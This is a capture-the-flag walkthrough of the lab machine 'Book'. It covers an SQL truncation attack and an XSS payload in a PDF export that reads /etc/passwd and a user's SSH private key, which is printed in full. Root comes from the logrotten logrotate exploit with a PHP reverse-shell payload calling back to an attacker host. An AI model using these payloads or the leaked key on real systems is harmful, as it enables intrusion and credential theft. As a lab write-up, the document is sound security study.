# Book

## Book

Book was a medium linux machine that involved using burpsuite with an sql truncation attack and then required xss to reveal an ssh key in the form of a pdf. Root was a simple exploit involving log files and logerate suid

## USER

### enumeration

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 06:00 EDT
Nmap scan report for book.htb (10.10.10.176)
Host is up (0.022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
```

Our nmap scansimply shows that there is port 22 open for ssh hinting that we will need ssh access later on in the box. And port 80 which will be the main use for the foothold on this box.

Port 80:

when visiting port 80 page we find that there is a sign up section and a login section.

```bash
kali@kali:~/boxes/book$ gobuster dir -u http://10.10.10.176/ -w /home/kali/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176/
[+] Threads:        10
[+] Wordlist:       /home/kali/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/10 06:11:32 Starting gobuster
===============================================================
/images (Status: 301)
/docs (Status: 301)
/admin (Status: 301)
```

We can see here that there is a page `/admin` we take a note of this and we will come back to this section later.

Taking a look at the web page we try to create a user and then login as them but it doesnt work. For this part we will try and SQL truncation attack.

### SQL attack

Poc:

In this attack what will happen is in the database there will be a fixed amount of charecters supplimented for the user creation. When this is overflown with more charecters than it should be it will truncate\(cut off\) the first e.g 20 charecters and execute the function at index 21, It then adds whatever is at index 21 to the dataabse, in our case we can do this with a user login and add an unauthenticated user to the mysql database. We can abuse this by supplimenting our own truncation and then try to add a new user to the system.

I make a user called `adminig` note: dont make the user called `admin` as it blocks something for later, i then give it the credentials `admin@book.htb` and password`123321`

we then intercept the request with burpsuite so we can add our truncation.

`name=admined&email=admin%40book.htb&password=123321` this is returned back.

So we have 3 values to work with here, first of all when we scout out the login section of the page we can see that it requests an email and a password, giving us a hint that the username isnt that important, this part is quite fiddly and without a writeup involved a little trial and error to see what returned a successfull login.

We add 7 spaces and and `A` to the end of our email making our final request:

```bash
name=admined&email=admin%40book.htb       A&password=123321
```

We then forward this back to the server and login with this. keeping our buresession alive as it makes the whole process easier. Whenever we clikc something we just click forward on the proxy tab and it takes us to the next section.

We now have the website as a user.

There are a few interseting tabs displayed such as collections and contact us, we take a closer look collections as there seems to be a file uplaod feature which could possibly be exploited.

On the contact us section we can see that it is sending a message to the email `admin@book.htb` We think back to our enumeration and realise that there is a directory we havent yet explored. We open `/admin` in a new tab\(make sure that you use 2 tabs\) and we see that it is another login page. For this we will use the same account that we logged in with for user with the truncation attack. After we login we can see that the admin has a whole new section of panels. There is many different things so we concentrate on the important stuff.

### XSS

We can see that in the collections section there is a PDF export, meaning a pdf is sent from somewhere to the admin who then ueses it. Could this possibly be coming from our user?

From here we go back to the user tab and take a look at the collections area.

We use this [website](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) for the next section.

There is a section on xss with pdfs , convinently we have a pdf vuln on the site so we know that this could be a good exploit.

```php
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

We add this code to both the sections in the collections tab as the user and upload a file e.g test.txt with some simple contents for example 1 word.

We then navigate to the admin panel and go onto the collections tab and download the pdf in collections column. Sure enough it is the `/etc/passwd` file.

So we can now get files off the system and onto our box, next we try to read the ssh key for the user. We know that the user is called `reader` as this is the user that came up in the passwd file.

we change the script to:

```php
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

And sure enough we get the ssh key for the user!.

### pdf to text

Now we have to find out a way to get the pdf key to text.

We find a github repository with a tools that we can do this with. we run `git clone https://github.com/pdfminer/pdfminer.six.git` and then go into the tools folder and execute `python pdf2txt.py 5652.pdf -o id_rsa`.

If you get errors with this you will have to `pip install pdfminer.six` to get the depndancies for running this file with python.

We now edit this file in a text editor and change the formatting of the top and bottom lines slightly to march an ssh-key format. We know have this:

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

We then `chmod 700` the file and ssh into the box as `reader` and read the use flag.

```bash
kali@kali:~/boxes/book$ ssh -i id_rsa reader@book.htb

reader@book:~$ ls
backups  lse.sh  user.txt
reader@book:~$ cat user.txt
51c1d4b51{...}}
```

## ROOT

### enumeration

After running pspy we realise that logrotate is running as root.

After some reasearching we find a github that has an explpoit [exploit](https://github.com/whotwagner/logrotten).

### exploitation

Exploitation steps:

```bash
reader@book:~$ cd /tmp
reader@book:/tmp$ mkdir shell
reader@book:/tmp$ cd  shell
reader@book:/tmp/shell$ nano logrotten.c
reader@book:/tmp/shell$ gcc -o logrotten logrotten.c

reader@book:/tmp/shell$ nano payload
reader@book:/tmp/shell$ ./logrotten -p ./payload /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
```

payload file:

```php
php -r '$sock=fsockopen("10.10.xx.xx",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

we have to echo data to the logs file to make it rotate otherwise it wont do anything

```bash
reader@book:~/backups$ cat access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
```

Note that it took a few attempts.

Then we get a connection back on our shell:

```bash
kali@kali:~/boxes/book$ nc -nlvp 1234
listening on [any] 1234 ...

connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.176] 47712
#  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCE.........
```

Then we can ssh as root and read the root flag.

```bash
kali@kali:~/boxes/book$ ssh -i root_rsa root@book.htb


root@book:~# cat /root/root.txt
84da92adf{...}
```

Thanks for reading hope that you enjoyed!

